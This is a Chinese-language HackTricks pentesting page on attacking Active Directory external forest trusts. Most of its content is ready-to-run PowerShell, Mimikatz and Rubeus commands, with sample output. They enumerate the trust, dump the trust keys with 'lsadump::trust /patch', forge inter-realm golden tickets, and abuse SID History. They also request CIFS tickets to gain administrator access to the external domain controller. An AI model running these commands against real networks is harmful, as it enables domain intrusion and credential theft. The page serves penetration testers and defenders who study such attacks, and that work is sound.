# 外部森林域 - 单向（入站）或双向

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想访问**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* 发现我们的独家[NFTs](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks衣服**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord组**](https://discord.gg/hRep4RUj7f) 或 [**电报组**](https://t.me/peass) 或在**Twitter**上**🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享您的黑客技巧**。

</details>

在这种情况下，外部域信任您（或彼此信任），因此您可以在其上获得某种访问权限。

## 枚举

首先，您需要**枚举**这种**信任**：
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
在先前的枚举中发现用户 **`crossuser`** 在 **`External Admins`** 组中，该组在 **外部域的 DC** 中具有 **管理员访问权限**。

## 初始访问

如果您在另一个域中找不到您的用户的任何 **特殊** 访问权限，您仍然可以返回到 AD 方法论，并尝试从一个非特权用户进行 **权限提升**（例如，像 kerberoasting 这样的操作）：

您可以使用 **Powerview 函数** 来使用 `-Domain` 参数枚举 **其他域**，就像这样：
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
## 冒充

### 登录

使用具有访问外部域的用户凭据的常规方法，您应该能够访问：
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History Abuse

您还可以在跨森林信任中滥用[**SID History**](sid-history-injection.md)。

如果用户从一个森林迁移到另一个森林，并且未启用**SID过滤**，则可以**添加来自另一个森林的SID**，并且在通过信任进行身份验证时，此**SID**将被**添加**到**用户的令牌**中。

{% hint style="warning" %}
作为提醒，您可以使用以下方式获取签名密钥
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
```
{% endhint %}

您可以使用**受信任**的密钥**签署**一个**冒充**当前域用户的TGT。
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### 完全模拟用户
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> - <a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家 **网络安全公司** 工作吗？想要看到你的 **公司在 HackTricks 中被宣传**？或者想要访问 **PEASS 的最新版本或下载 HackTricks 的 PDF**？查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* 探索 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family)
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) **Discord 群组**](https://discord.gg/hRep4RUj7f) 或 **电报群组** 或 **关注** 我的 **推特** **🐦**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **通过向 [hacktricks 仓库](https://github.com/carlospolop/hacktricks) 和 [hacktricks-cloud 仓库](https://github.com/carlospolop/hacktricks-cloud) 提交 PR 来分享你的黑客技巧**。

</details>
